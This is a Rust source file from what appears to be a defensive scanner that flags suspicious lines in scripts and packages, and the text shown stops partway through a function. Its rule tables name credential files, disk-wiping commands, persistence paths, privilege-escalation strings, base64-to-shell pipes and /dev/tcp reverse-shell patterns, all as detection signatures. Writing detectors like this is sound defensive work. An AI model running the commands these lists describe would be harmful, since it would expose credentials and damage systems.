//! Local, line-oriented heuristics.
//!
//! Every rule is a `RuleId` variant with a `Matcher`, so adding a rule without
//! deciding how it matches is a compile error rather than a silent miss.

use std::net::IpAddr;
use std::path::Path;

use crate::report::Severity;

#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Hash)]
pub enum RuleId {
    DownloadAndExecute,
    EncodedCommandExecution,
    CredentialFileAccess,
    DestructiveSystemOperation,
    PersistenceModification,
    ShellCommandExecution,
    PrivilegeEscalation,
    CredentialExfiltration,
    CleartextNetworkRequest,
    DirectIpNetworkRequest,
    DisabledTlsVerification,
    GitConfigCommand,
    SshCommand,
    ModifiedPackageFile,
    HiddenProgram,
    RunningFromTemp,
    PreloadedLibrary,
    KeyboardReader,
    UnknownKernelModule,
    UnknownPrivilegedFile,
    NetworkListener,
}

/// How a rule decides whether a lowercased line matches.
enum Matcher {
    /// Any of these patterns, respecting identifier boundaries (see
    /// `contains_pattern`).
    Patterns(&'static [&'static str]),
    Custom(fn(&str) -> bool),
    /// Reported by a dedicated check (the network destination inventory, the
    /// git config check) instead of per line.
    Reported,
}

const CREDENTIAL_FILES: &[&str] = &[
    ".ssh/id_rsa",
    ".ssh/id_ed25519",
    ".ssh/id_ecdsa",
    ".ssh/id_dsa",
    ".gnupg/",
    ".password-store",
    ".netrc",
    ".git-credentials",
    ".local/share/opencode/auth.json",
    ".claude/.credentials.json",
    "logins.json",
    "key4.db",
    ".aws/credentials",
    ".config/gcloud/credentials.db",
    "/etc/shadow",
    "login data",
    "cookies.sqlite",
];

const ENCODED_PIPES: &[&str] = &[
    "base64 -d | sh",
    "base64 --decode | sh",
    "base64 -d | bash",
    "base64 --decode | bash",
];

const DESTRUCTIVE_COMMANDS: &[&str] = &[
    "shred /dev/",
    "dd if=/dev/zero of=/dev/",
    "dd if=/dev/urandom of=/dev/",
    "--no-preserve-root",
    "wipefs -a",
    "wipefs --all",
    "blkdiscard /dev/",
    "find / -delete",
];

const PERSISTENCE_PATHS: &[&str] = &[
    ".config/autostart/",
    ".config/systemd/user/",
    ".config/environment.d/",
    "/etc/systemd/system/",
    "/etc/cron.",
    "/etc/rc.local",
    "/etc/ld.so.preload",
    "/etc/profile.d/",
    "crontab -",
    ".ssh/authorized_keys",
    ".bashrc",
    ".zshrc",
    "~/.profile",
    "$home/.profile",
    "${home}/.profile",
    ".bash_profile",
    ".zprofile",
    ".config/fish/config.fish",
    ".config/omarchy/hooks/",
    "/etc/xdg/autostart/",
    "/etc/udev/rules.d/",
    "exec-once",
    "/library/launchagents/",
    "currentversion\\run",
];

const SHELL_EXECUTION: &[&str] = &[
    "os.system(",
    "os.execute(",
    "io.popen(",
    "subprocess.popen(",
    "subprocess.run(",
    "child_process.exec(",
    "child_process.execsync(",
    "command::new(\"sh\")",
    "command::new(\"bash\")",
    "eval(",
    "os.popen(",
    "subprocess.call(",
    "subprocess.check_call(",
    "subprocess.check_output(",
    "__import__('os').system(",
    "__import__(\"os\").system(",
    "child_process').exec(",
    "child_process\").exec(",
];

const PRIVILEGE_ESCALATION: &[&str] = &[
    "sudo ",
    "doas ",
    "run0 ",
    "pkexec ",
    "setuid(",
    "chmod u+s",
    "chmod 4755",
    "chmod 6755",
    "chmod +s",
    "install -m4755",
    "install -m 4755",
    "install -dm4755",
    "setcap ",
    "cap_set_file",
    "/etc/sudoers",
    "usermod -ag",
    "chown root",
];

const DISABLED_TLS: &[&str] = &[
    "--insecure",
    "--no-check-certificate",
    "insecureskipverify: true",
    "rejectunauthorized: false",
    "node_tls_reject_unauthorized=0",
    "verify=false",
    "cert_none",
];

impl RuleId {
    pub const ALL: [Self; 21] = [
        Self::DownloadAndExecute,
        Self::EncodedCommandExecution,
        Self::CredentialFileAccess,
        Self::DestructiveSystemOperation,
        Self::PersistenceModification,
        Self::ShellCommandExecution,
        Self::PrivilegeEscalation,
        Self::CredentialExfiltration,
        Self::CleartextNetworkRequest,
        Self::DirectIpNetworkRequest,
        Self::DisabledTlsVerification,
        Self::GitConfigCommand,
        Self::SshCommand,
        Self::ModifiedPackageFile,
        Self::HiddenProgram,
        Self::RunningFromTemp,
        Self::PreloadedLibrary,
        Self::KeyboardReader,
        Self::UnknownKernelModule,
        Self::UnknownPrivilegedFile,
        Self::NetworkListener,
    ];

    pub fn from_name(name: &str) -> Option<Self> {
        Self::ALL.into_iter().find(|rule| rule.name() == name)
    }

    pub const fn name(self) -> &'static str {
        match self {
            Self::DownloadAndExecute => "download-and-execute",
            Self::EncodedCommandExecution => "encoded-command-execution",
            Self::CredentialFileAccess => "credential-file-access",
            Self::DestructiveSystemOperation => "destructive-system-operation",
            Self::PersistenceModification => "persistence-modification",
            Self::ShellCommandExecution => "shell-command-execution",
            Self::PrivilegeEscalation => "privilege-escalation",
            Self::CredentialExfiltration => "credential-exfiltration",
            Self::CleartextNetworkRequest => "cleartext-network-request",
            Self::DirectIpNetworkRequest => "direct-ip-network-request",
            Self::DisabledTlsVerification => "disabled-tls-verification",
            Self::GitConfigCommand => "git-config-command",
            Self::SshCommand => "ssh-command",
            Self::ModifiedPackageFile => "modified-package-file",
            Self::HiddenProgram => "hidden-program",
            Self::RunningFromTemp => "running-from-temp",
            Self::PreloadedLibrary => "preloaded-library",
            Self::KeyboardReader => "keyboard-reader",
            Self::UnknownKernelModule => "unknown-kernel-module",
            Self::UnknownPrivilegedFile => "unknown-privileged-file",
            Self::NetworkListener => "network-listener",
        }
    }

    pub const fn severity(self) -> Severity {
        match self {
            Self::DownloadAndExecute
            | Self::EncodedCommandExecution
            | Self::DestructiveSystemOperation
            | Self::CredentialExfiltration
            | Self::ModifiedPackageFile
            | Self::HiddenProgram
            | Self::PreloadedLibrary
            | Self::UnknownKernelModule
            | Self::UnknownPrivilegedFile => Severity::High,
            Self::NetworkListener => Severity::Low,
            Self::CredentialFileAccess
            | Self::PersistenceModification
            | Self::ShellCommandExecution
            | Self::PrivilegeEscalation
            | Self::CleartextNetworkRequest
            | Self::DirectIpNetworkRequest
            | Self::DisabledTlsVerification
            | Self::GitConfigCommand
            | Self::SshCommand
            | Self::RunningFromTemp
            | Self::KeyboardReader => Severity::Medium,
        }
    }

    pub const fn description(self) -> &'static str {
        match self {
            Self::DownloadAndExecute => {
                "Downloads are piped directly into a shell; inspect the remote script before running it."
            }
            Self::EncodedCommandExecution => {
                "Encoded or dynamically evaluated data appears to be executed as a command."
            }
            Self::CredentialFileAccess => {
                "References a commonly sensitive credential or private-key file; inspect how it is used."
            }
            Self::DestructiveSystemOperation => {
                "Contains a command associated with destructive disk or filesystem changes."
            }
            Self::PersistenceModification => {
                "May install persistence through a startup, scheduled-task, or SSH authorization file."
            }
            Self::ShellCommandExecution => {
                "Starts a shell or dynamically evaluates a command; review how input is constructed."
            }
            Self::PrivilegeEscalation => {
                "Requests elevated privileges or changes privilege-related system configuration."
            }
            Self::CredentialExfiltration => {
                "Combines access to sensitive data with an outbound network request."
            }
            Self::CleartextNetworkRequest => "Sends a network request over unencrypted HTTP.",
            Self::DirectIpNetworkRequest => {
                "Sends a request to a hard-coded IP address instead of a named host."
            }
            Self::DisabledTlsVerification => {
                "Disables TLS certificate verification for network requests."
            }
            Self::GitConfigCommand => {
                "A git config in the tree names a command that git runs on later commands here (status, describe, diff)."
            }
            Self::SshCommand => {
                "An SSH file runs a command when someone logs in (command= or environment= on a key, or ~/.ssh/rc)."
            }
            Self::ModifiedPackageFile => {
                "A file a package installed has been changed since; it is not what the package shipped."
            }
            Self::HiddenProgram => {
                "A running program has no file on disk: it was deleted, or lives only in memory."
            }
            Self::RunningFromTemp => {
                "A program runs from a temporary or cache directory, where downloads land."
            }
            Self::PreloadedLibrary => {
                "A library no package installed is preloaded into a running program (LD_PRELOAD)."
            }
            Self::KeyboardReader => {
                "A program no package installed reads the keyboard device directly."
            }
            Self::UnknownKernelModule => "A loaded kernel module was not installed by a package.",
            Self::UnknownPrivilegedFile => {
                "A file no package vouches for runs with extra rights (setuid, setgid or capabilities)."
            }
            Self::NetworkListener => {
                "An interpreter (Python, a shell, Node) listens on the network, with no script on disk to look at."
            }
        }
    }

    const fn matcher(self) -> Matcher {
        match self {
            Self::DownloadAndExecute => Matcher::Custom(is_download_piped_to_shell),
            Self::EncodedCommandExecution => Matcher::Custom(is_encoded_command_execution),
            Self::CredentialFileAccess => Matcher::Patterns(CREDENTIAL_FILES),
            Self::DestructiveSystemOperation => Matcher::Custom(is_destructive_operation),
            Self::PersistenceModification => Matcher::Custom(is_persistence),
            Self::ShellCommandExecution => Matcher::Patterns(SHELL_EXECUTION),
            Self::PrivilegeEscalation => Matcher::Custom(is_privilege_escalation),
            Self::CredentialExfiltration => Matcher::Custom(looks_like_credential_exfiltration),
            Self::CleartextNetworkRequest
            | Self::DirectIpNetworkRequest
            | Self::GitConfigCommand
            | Self::SshCommand
            | Self::ModifiedPackageFile
            | Self::HiddenProgram
            | Self::RunningFromTemp
            | Self::PreloadedLibrary
            | Self::KeyboardReader
            | Self::UnknownKernelModule
            | Self::UnknownPrivilegedFile
            | Self::NetworkListener => Matcher::Reported,
            Self::DisabledTlsVerification => Matcher::Patterns(DISABLED_TLS),
        }
    }

    /// Context rules that describe something a script might do, which
    /// install notes routinely tell the user to do by hand (`sudo systemctl
    /// enable ...`, `add this to ~/.bashrc`). They skip text a script only
    /// prints. The rules for directly dangerous commands still match printed
    /// text, so a message cannot hide one.
    pub const fn ignores_messages(self) -> bool {
        match self {
            Self::CredentialFileAccess
            | Self::PersistenceModification
            | Self::PrivilegeEscalation
            | Self::CleartextNetworkRequest
            | Self::DirectIpNetworkRequest
            | Self::DisabledTlsVerification => true,
            Self::DownloadAndExecute
            | Self::EncodedCommandExecution
            | Self::DestructiveSystemOperation
            | Self::ShellCommandExecution
            | Self::CredentialExfiltration
            | Self::GitConfigCommand
            | Self::SshCommand
            | Self::ModifiedPackageFile
            | Self::HiddenProgram
            | Self::RunningFromTemp
            | Self::PreloadedLibrary
            | Self::KeyboardReader
            | Self::UnknownKernelModule
            | Self::UnknownPrivilegedFile
            | Self::NetworkListener => false,
        }
    }

    fn matches_line(self, lowered: &str) -> bool {
        match self.matcher() {
            Matcher::Patterns(patterns) => contains_any(lowered, patterns),
            Matcher::Custom(matches) => matches(lowered),
            Matcher::Reported => false,
        }
    }
}

/// The line rules matched by one lowercased line: `code` with comments
/// blanked, `quiet` with printed messages blanked as well (see `mask`).
pub fn line_rules<'a>(code: &'a str, quiet: &'a str) -> impl Iterator<Item = RuleId> + 'a {
    RuleId::ALL
        .into_iter()
        .filter(move |rule| rule.matches_line(if rule.ignores_messages() { quiet } else { code }))
}

fn is_identifier_byte(byte: u8) -> bool {
    byte.is_ascii_alphanumeric() || byte == b'_'
}

/// Finds `pattern` in `haystack`. A pattern that starts with an identifier
/// character must not continue an identifier or member access, so `eval(`
/// matches `eval(x)` but not `retrieval(x)` or `model.eval()`.
fn contains_pattern(haystack: &str, pattern: &str) -> bool {
    pattern_starts(haystack, pattern).next().is_some()
}

/// Where `pattern` occurs in `haystack`, respecting identifier boundaries.
fn pattern_starts<'a>(haystack: &'a str, pattern: &'a str) -> impl Iterator<Item = usize> + 'a {
    let needs_boundary = pattern.bytes().next().is_some_and(is_identifier_byte);
    haystack
        .match_indices(pattern)
        .map(|(start, _)| start)
        .filter(move |start| {
            !needs_boundary
                || haystack.as_bytes()[..*start]
                    .last()
                    .is_none_or(|previous| !is_identifier_byte(*previous) && *previous != b'.')
        })
}

/// A persistence path, unless it is a file a PKGBUILD puts in the package
/// (`"$pkgdir"/etc/profile.d/x.sh`): pacman installs it as a listed package
/// file, just like a unit under `/usr/lib/systemd/system`.
fn is_persistence(line: &str) -> bool {
    PERSISTENCE_PATHS.iter().any(|pattern| {
        pattern_starts(line, pattern).any(|start| {
            let before = &line[..start];
            let word = before
                .rfind(char::is_whitespace)
                .map_or(before, |space| &before[space + 1..])
                .trim_start_matches(['>', '<', '"', '\'', '(']);
            let packaged = is_pkgdir_prefix(word)
                && !line[start..]
                    .split(char::is_whitespace)
                    .next()
                    .is_some_and(|rest| rest.contains(".."))
                && !word.contains("..");
            !packaged
        })
    })
}

/// `$pkgdir` or `${pkgdir}` as a whole word, possibly quoted: `$pkgdirz`
/// is another (empty) variable, so it does not count.
fn is_pkgdir_prefix(word: &str) -> bool {
    let rest = word
        .strip_prefix("${pkgdir}")
        .or_else(|| word.strip_prefix("$pkgdir"));
    rest.is_some_and(|rest| {
        rest.chars()
            .next()
            .is_none_or(|next| !(next.is_ascii_alphanumeric() || next == '_'))
    })
}

fn contains_any(haystack: &str, patterns: &[&str]) -> bool {
    patterns
        .iter()
        .any(|pattern| contains_pattern(haystack, pattern))
}

/// Programs that fetch from the network.
const FETCHERS: &[&str] = &["curl", "wget", "aria2c"];

pub fn is_download_piped_to_shell(line: &str) -> bool {
    // Bash's own network redirection: a reverse shell or a fetch without
    // any fetcher.
    if line.contains("/dev/tcp/") || line.contains("/dev/udp/") {
        return true;
    }
    if !FETCHERS.iter().any(|fetcher| line.contains(fetcher)) {
        return false;
    }
    pipes_into_shell(line, |segment| {
        FETCHERS
            .iter()
            .any(|fetcher| contains_pattern(segment, fetcher))
    }) || runs_fetched_text(line)
}

/// Whether the command on `line` goes on in `next`: a trailing backslash,
/// pipe or `&&`, or a pipe opening the next line.
pub fn continues(line: &str, next: &str) -> bool {
    let line = line.trim_end();
    line.ends_with('\\')
        || line.ends_with('|')
        || line.ends_with("&&")
        || next.trim_start().starts_with('|')
}

/// What runs a file given to it.
const RUNNERS: &[&str] = &[
    "sh", "bash", "zsh", "dash", "ksh", "fish", "source", ".", "python", "perl", "node", "ruby",
    "php",
];

fn program_name(word: &str) -> &str {
    word.rsplit('/').next().unwrap_or_default()
}

/// A file name as written, without a leading `./`.
fn as_file(word: &str) -> Option<String> {
    let name = word.trim_end_matches(';').trim_start_matches("./");
    (!name.is_empty()).then(|| name.to_string())
}

/// The file a fetch on `line` is saved as: `curl -o x`, `wget -O x`,
/// `curl … > x`, or the name in the address for `wget` and `curl -O`.
pub fn fetched_file(line: &str) -> Option<String> {
    let words: Vec<String> = shell_words(line)
        .iter()
        .map(|word| unquoted(word))
        .collect();
    let at = words
        .iter()
        .position(|word| FETCHERS.contains(&program_name(word)))?;
    let fetcher = program_name(&words[at]);
    let mut by_address = fetcher == "wget";
    let mut address = None;
    let mut rest = words[at + 1..].iter();
    while let Some(word) = rest.next() {
        match word.as_str() {
            ";" | "&&" | "||" | "|" => break,
            "-O" | "--remote-name" if fetcher == "curl" => by_address = true,
            // wget's `-o` names its log.
            "-o" if fetcher == "wget" => {
                rest.next();
            }
            ">" | ">>" => return rest.next().and_then(|name| as_file(name)),
            "-o" | "-O" | "--output" | "--output-document" | "--out" => {
                match rest.next().map(String::as_str) {
                    // Standard output: only a redirection saves it.
                    Some("-") => by_address = false,
                    name => return name.and_then(as_file),
                }
            }
            _ if fetcher == "wget"
                && word.starts_with('-')
                && !word.starts_with("--")
                && word.ends_with("O-") =>
            {
                by_address = false;
            }
            // Short options given together: `-fsSLo x`, `-qO x`.
            _ if word.len() > 2
                && word.starts_with('-')
                && !word.starts_with("--")
                && word.ends_with(['o', 'O'])
                && !(fetcher == "wget" && word.ends_with('o')) =>
            {
                if word.ends_with('O') && fetcher == "curl" {
                    by_address = true;
                } else {
                    match rest.next().map(String::as_str) {
                        Some("-") => by_address = false,
                        name => return name.and_then(as_file),
                    }
                }
            }
            _ => {
                if let Some(name) = [">>", ">"]
                    .iter()
                    .find_map(|option| word.strip_prefix(option))
                {
                    return as_file(name);
                }
                match ["--output=", "--output-document=", "--out="]
                    .iter()
                    .find_map(|option| word.strip_prefix(option))
                {
                    Some("-") => by_address = false,
                    Some(name) => return as_file(name),
                    None => {}
                }
                if word.contains("://") {
                    address = Some(word);
                }
            }
        }
    }
    let address = address.filter(|_| by_address)?;
    let path = address.split(['?', '#']).next().unwrap_or_default();
    as_file(program_name(path.trim_end_matches(';')))
}

/// Whether `line` runs the file named `file`: given to a shell or an
/// interpreter, sourced, or run by its path.
pub fn runs_file(line: &str, file: &str) -> bool {
    let is_named =
        |word: &str| as_file(word.trim_start_matches('<')).is_some_and(|name| name == file);
    let names_it = |statement: &str| {
        shell_words(statement)
            .iter()
            .any(|word| is_named(&unquoted(word)))
    };
    // `cat x | sh`.
    if pipes_into_shell(line, names_it) {
        return true;
    }
    let line = line.replace("&&", ";").replace("||", ";");
    line.split([';', '|']).any(|statement| {
        let words: Vec<String> = shell_words(statement)
            .iter()
            .map(|word| unquoted(word))
            .collect();
        let mut words = words.iter().map(String::as_str).skip_while(|word| {
            matches!(
                *word,
                "sudo" | "doas" | "run0" | "env" | "command" | "exec" | "then" | "do" | "else"
            ) || word.starts_with('-')
        });
        let Some(program) = words.next() else {
            return false;
        };
        if (program.contains('/') || program.starts_with('$')) && is_named(program) {
            return true;
        }
        // `python3.12` is `python`.
        let name = program_name(program);
        let unversioned =
            name.trim_end_matches(|character: char| character.is_ascii_digit() || character == '.');
        let arguments: Vec<&str> = words.collect();
        // Only parsed or compiled: `sh -n`, `node --check`, `python -m`.
        let only_checks = arguments
            .iter()
            .take_while(|word| word.starts_with('-'))
            .any(|word| {
                matches!(
                    (unversioned, *word),
                    ("sh" | "bash" | "zsh" | "dash" | "ksh", "-n")
                        | ("python", "-m")
                        | ("node", "--check")
                )
            });
        (RUNNERS.contains(&name) || (!unversioned.is_empty() && RUNNERS.contains(&unversioned)))
            && !only_checks
            && arguments.into_iter().any(is_named)
    })
}

/// The files `line` runs or reads in as code, as written: what it gives a
/// shell or an interpreter (`sh x`, `. ./x`, `python3 x.py`, `sh <x`),
/// what it runs by its path (`./x`, `/opt/x`), and what it pipes into a
/// shell (`cat x | sh`).
pub fn run_targets(line: &str) -> Vec<String> {
    let mut found: Vec<String> = Vec::new();
    let mut add = |word: &str| {
        if let Some(name) = as_file(word.trim_start_matches('<'))
            && !name.starts_with('-')
            && !found.contains(&name)
        {
            found.push(name);
        }
    };
    let flat = line.replace("&&", ";").replace("||", ";");
    for (index, statement) in flat.split(';').enumerate() {
        if index >= MAX_STATEMENTS {
            break;
        }
        let segments: Vec<&str> = statement.split('|').take(MAX_SEGMENTS).collect();
        // Whether a shell reads what comes after each segment, worked out
        // once from the end.
        let mut shell_after = vec![false; segments.len() + 1];
        for at in (0..segments.len()).rev() {
            let is_shell = shell_words(segments[at])
                .first()
                .map(|word| unquoted(word))
                .is_some_and(|word| {
                    matches!(program_name(&word), "sh" | "bash" | "zsh" | "dash" | "ksh")
                });
            shell_after[at] = shell_after[at + 1] || is_shell;
        }
        for (at, segment) in segments.iter().enumerate() {
            let words: Vec<String> = shell_words(segment)
                .iter()
                .map(|word| unquoted(word))
                .collect();
            let mut words = words.iter().map(String::as_str).skip_while(|word| {
                matches!(
                    *word,
                    "sudo"
                        | "doas"
                        | "run0"
                        | "env"
                        | "command"
                        | "exec"
                        | "then"
                        | "do"
                        | "else"
                        | "!"
                        | "nohup"
                        | "nice"
                        | "setsid"
                        | "time"
                ) || word.starts_with('-')
                    || (word.contains('=') && !word.starts_with(['/', '.', '$']))
            });
            let Some(program) = words.next() else {
                continue;
            };
            if program.contains('/') {
                add(program);
            }
            let arguments: Vec<&str> = words.collect();
            // `cat x | sh`: what is read into a shell after it.
            let piped_into_shell = shell_after[at + 1];
            if program_name(program) == "cat" && piped_into_shell {
                for argument in &arguments {
                    if !argument.starts_with('-') {
                        add(argument);
                    }
                }
                continue;
            }
            let name = program_name(program);
            let unversioned = name
                .trim_end_matches(|character: char| character.is_ascii_digit() || character == '.');
            if !(RUNNERS.contains(&name)
                || (!unversioned.is_empty() && RUNNERS.contains(&unversioned)))
            {
                continue;
            }
            // Code given on the command line, or only checked: no file.
            let options: Vec<&&str> = arguments
                .iter()
                .take_while(|word| word.starts_with('-'))
                .collect();
            let shell = matches!(unversioned, "sh" | "bash" | "zsh" | "dash" | "ksh");
            if options.iter().any(|option| {
                matches!(**option, "-c" | "-n" | "-m" | "--check")
                    || (**option == "-e" && !shell)
                    || (shell
                        && option.len() > 2
                        && !option.starts_with("--")
                        && option.ends_with('c'))
            }) {
                continue;
            }
            if let Some(first) = arguments.iter().find(|word| !word.starts_with('-')) {
                add(first);
            }
        }
    }
    found
}

/// Variables a file sets to a fetcher or a shell (`F=curl`, `S="bash"`),
/// lowercased, so `$F … | $S` is judged as what it runs.
pub fn command_variables(text: &str) -> Vec<(String, String)> {
    let mut found: Vec<(String, String)> = Vec::new();
    for line in text.lines() {
        let line = line.trim().strip_prefix("export ").unwrap_or(line.trim());
        let Some((name, value)) = line.split_once('=') else {
            continue;
        };
        let value = value.trim_matches(['"', '\'']);
        let is_name = !name.is_empty()
            && name.starts_with(|c: char| c.is_ascii_alphabetic() || c == '_')
            && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_');
        let program = program_name(value);
        if is_name
            && !value.contains(char::is_whitespace)
            && (FETCHERS.contains(&program) || matches!(program, "sh" | "bash" | "zsh" | "dash"))
        {
            let name = name.to_ascii_lowercase();
            found.retain(|(known, _)| *known != name);
            found.push((name, program.to_string()));
            if found.len() > MAX_COMMAND_VARIABLES {
                found.remove(0);
            }
        }
    }
    found
}

/// The most such variables one file keeps.
const MAX_COMMAND_VARIABLES: usize = 32;

/// `code` with `$name` and `${name}` of `variables` written out. Names are
/// matched as given: a caller that wants it case-blind lowercases both.
pub fn with_variables(code: &str, variables: &[(String, String)]) -> String {
    if variables.is_empty() || !code.contains('$') {
        return code.to_string();
    }
    let mut out = code.to_string();
    for (name, value) in variables {
        out = out.replace(&format!("${{{name}}}"), value);
        // `$name` only where the name ends there.
        let pattern = format!("${name}");
        let mut result = String::with_capacity(out.len());
        let mut rest = out.as_str();
        while let Some(at) = rest.find(&pattern) {
            let after = &rest[at + pattern.len()..];
            result.push_str(&rest[..at]);
            if after.starts_with(|c: char| c.is_ascii_alphanumeric() || c == '_') {
                result.push_str(&pattern);
            } else {
                result.push_str(value);
            }
            rest = after;
        }
        result.push_str(rest);
        out = result;
    }
    out
}

/// The most pipeline parts of one statement looked at.
const MAX_SEGMENTS: usize = 64;

/// The most statements of one line looked at for what they run.
const MAX_STATEMENTS: usize = 64;

/// A shell reading a fetch through process substitution (`sh <(curl …)`,
/// `source <(curl …)`) or running a command substitution of one
/// (`bash -c "$(curl …)"`, `eval "$(curl …)"`).
fn runs_fetched_text(line: &str) -> bool {
    let substituted = FETCHERS.iter().any(|fetcher| {
        ["<(", "$(", "`"].iter().any(|open| {
            line.contains(&format!("{open}{fetcher}"))
                || line.contains(&format!("{open} {fetcher}"))
        })
    });
    substituted
        && (line.contains("<(")
            || ["sh -c", "bash -c", "zsh -c", "eval "]
                .iter()
                .any(|runner| contains_pattern(line, runner)))
}

/// Whether a pipeline segment for which `source` holds is followed, later in
/// the pipeline, by a shell reading it: `| sh`, `| sudo bash`, `|/bin/sh`,
/// `| env bash`.
fn pipes_into_shell(line: &str, source: impl Fn(&str) -> bool) -> bool {
    // `a || b` runs b instead of a, not on its output.
    let line = line.replace("||", ";");
    let segments: Vec<&str> = line.split('|').collect();
    let Some(first) = segments.iter().position(|segment| source(segment)) else {
        return false;
    };
    segments[first + 1..].iter().any(|command| {
        let mut words = command.split_whitespace();
        let mut word = words.next().unwrap_or_default();
        while matches!(word, "sudo" | "doas" | "run0" | "env" | "command" | "exec")
            || word.starts_with('-')
        {
            word = words.next().unwrap_or_default();
        }
        let program = word
            .trim_start_matches(['(', '"', '\''])
            .rsplit('/')
            .next()
            .unwrap_or_default();
        ["sh", "bash", "zsh", "dash"].iter().any(|shell| {
            program.strip_prefix(shell).is_some_and(|rest| {
                rest.is_empty() || rest.starts_with([')', '`', ';', '&', '"', '\''])
            })
        })
    })
}

fn is_encoded_command_execution(line: &str) -> bool {
    contains_any(line, ENCODED_PIPES)
        || pipes_into_shell(line, |segment| {
            [
                "base64 -d",
                "base64 --decode",
                "xxd -r",
                "openssl base64 -d",
                "openssl enc -d",
            ]
            .iter()
            .any(|decoder| segment.contains(decoder))
        })
        || is_encoded_data_executed(line)
}

pub fn is_encoded_data_executed(line: &str) -> bool {
    let decodes_data =
        line.contains("base64.b64decode(") || line.contains("[convert]::frombase64string");
    let executes_data = ["exec(", "eval(", "os.system(", "invoke-expression", "iex "]
        .iter()
        .any(|pattern| line.contains(pattern));
    decodes_data && executes_data
}

fn is_privilege_escalation(line: &str) -> bool {
    match without_sandbox_helper_setuid(line) {
        Some(rest) => contains_any(&rest, PRIVILEGE_ESCALATION),
        None => contains_any(line, PRIVILEGE_ESCALATION),
    }
}

/// The setuid sandbox helpers of Chromium-based browsers and Electron apps.
/// They must be setuid root to sandbox their renderers, so every package of
/// Chrome, Brave, Edge, Opera, Vivaldi or an Electron app sets them up.
const SANDBOX_HELPERS: &[&str] = &[
    "chrome-sandbox",
    "chrome_sandbox",
    "msedge-sandbox",
    "opera_sandbox",
    "vivaldi-sandbox",
];

/// Whether `path` names one of those helpers.
pub fn is_sandbox_helper(path: &str) -> bool {
    SANDBOX_HELPERS.contains(&path.rsplit('/').next().unwrap_or_default())
}

/// The line with every `chmod 4755` / `chmod u+s` / `chown root` of a lone
/// sandbox helper removed, or `None` when it has none. Any other privilege
/// change on the line still matches.
fn without_sandbox_helper_setuid(line: &str) -> Option<String> {
    let words = shell_words(line);
    let mut kept: Vec<&str> = Vec::with_capacity(words.len());
    let mut exempted = false;
    let mut index = 0;
    while index < words.len() {
        let sets_up_helper = matches!(
            (
                words[index].as_str(),
                words.get(index + 1).map(String::as_str)
            ),
            ("chmod", Some("4755" | "u+s")) | ("chown", Some("root" | "root:root"))
        ) && words.get(index + 2).is_some_and(|target| {
            let target = unquoted(target.trim_end_matches(';'));
            SANDBOX_HELPERS.contains(&target.rsplit('/').next().unwrap_or_default())
        }) && words.get(index + 3).is_none_or(|next| {
            matches!(next.as_str(), "||" | "&&" | ";" | "|" | "2>/dev/null")
                || words[index + 2].ends_with(';')
        });
        if sets_up_helper {
            exempted = true;
            index += 3;
        } else {
            kept.push(&words[index]);
            index += 1;
        }
    }
    exempted.then(|| kept.join(" "))
}

fn is_destructive_operation(line: &str) -> bool {
    contains_any(line, DESTRUCTIVE_COMMANDS)
        || writes_a_device(line)
        || formats_filesystem(line)
        || removes_root_or_home(line)
}

/// `dd` writing to a block device, in either argument order.
fn writes_a_device(line: &str) -> bool {
    let words: Vec<String> = shell_words(line)
        .iter()
        .map(|word| unquoted(word))
        .collect();
    words
        .iter()
        .any(|word| word == "dd" || word.ends_with("/dd"))
        && words.iter().any(|word| {
            word.strip_prefix("of=/dev/").is_some_and(|device| {
                !matches!(device, "null" | "stdout" | "stderr" | "zero")
                    && !device.starts_with("fd/")
                    && !device.starts_with("shm/")
            })
        })
}

/// Commands that only handle a file by name, so a `mkfs.*` argument is a
/// program being packaged or inspected rather than run.
const FILE_COMMANDS: &[&str] = &[
    "install",
    "cp",
    "mv",
    "ln",
    "chmod",
    "chown",
    "rm",
    "strip",
    "patchelf",
    "touch",
    "ls",
    "stat",
    "file",
    "test",
    "[",
    "sha256sum",
    "b2sum",
    "md5sum",
];

/// A `mkfs.*` program that is run. Packaging one (`install -Dm755
/// mkfs.erofs "$pkgdir/..."`, or its path alone on a continuation line) is
/// not; every other mention is, including inside another language's string.
fn formats_filesystem(line: &str) -> bool {
    if !line.contains("mkfs.") {
        return false;
    }
    line.split([';', '|', '&'])
        .filter(|segment| segment.contains("mkfs."))
        .any(|segment| {
            // A path alone, as on a continuation line, runs nothing.
            if segment
                .split_whitespace()
                .filter(|word| *word != "\\")
                .count()
                <= 1
            {
                return false;
            }
            let words = shell_words(segment);
            let command = words
                .iter()
                .map(|word| unquoted(word))
                .find(|word| !matches!(word.as_str(), "sudo" | "doas") && !word.starts_with('-'))
                .unwrap_or_default();
            !FILE_COMMANDS.contains(&command.rsplit('/').next().unwrap_or_default())
        })
}

/// Splits a command line into words at whitespace outside quotes. Quote
/// characters are kept in the words.
fn shell_words(line: &str) -> Vec<String> {
    let mut words = Vec::new();
    let mut word = String::new();
    let mut quote: Option<char> = None;
    for character in line.chars() {
        if quote.is_none() && character.is_whitespace() {
            if !word.is_empty() {
                words.push(std::mem::take(&mut word));
            }
            continue;
        }
        match quote {
            Some(open) if character == open => quote = None,
            None if character == '"' || character == '\'' => quote = Some(character),
            Some(_) | None => {}
        }
        word.push(character);
    }
    if !word.is_empty() {
        words.push(word);
    }
    words
}

fn unquoted(word: &str) -> String {
    word.chars()
        .filter(|character| !matches!(character, '"' | '\''))
        .collect()
}

/// Recursive `rm` of `/`, `/*`, `~` or `$HOME` itself. Removing paths below
/// them (`rm -rf /tmp/build`, `rm -rf "$pkgdir"`) is ordinary build hygiene.
pub fn removes_root_or_home(line: &str) -> bool {
    let tokens: Vec<&str> = line.split_whitespace().collect();

    tokens.iter().enumerate().any(|(index, token)| {
        let command = token.trim_start_matches(['(', '`', '{']);
        if command != "rm" && !command.ends_with("/rm") {
            return false;
        }

        let mut arguments = Vec::new();
        for argument in &tokens[index + 1..] {
            if matches!(*argument, ";" | "&&" | "||" | "|" | "&") {
                break;
            }
            arguments.push(*argument);
            if argument.ends_with([';', '&', '|']) {
                break;
            }
        }
        let recursive = arguments.iter().any(|argument| {
            *argument == "--recursive"
                || argument
                    .strip_prefix('-')
                    .is_some_and(|flags| !flags.starts_with('-') && flags.contains('r'))
        });

        recursive
            && arguments
                .iter()
                .filter(|argument| !argument.starts_with('-'))
                .any(|argument| {
                    let target = argument
                        .trim_end_matches([';', ')', '`'])
                        .trim_matches(['"', '\'']);
                    is_root_or_home(target)
                })
    })
}

fn is_root_or_home(target: &str) -> bool {
    let base = target.trim_end_matches(['/', '*']);
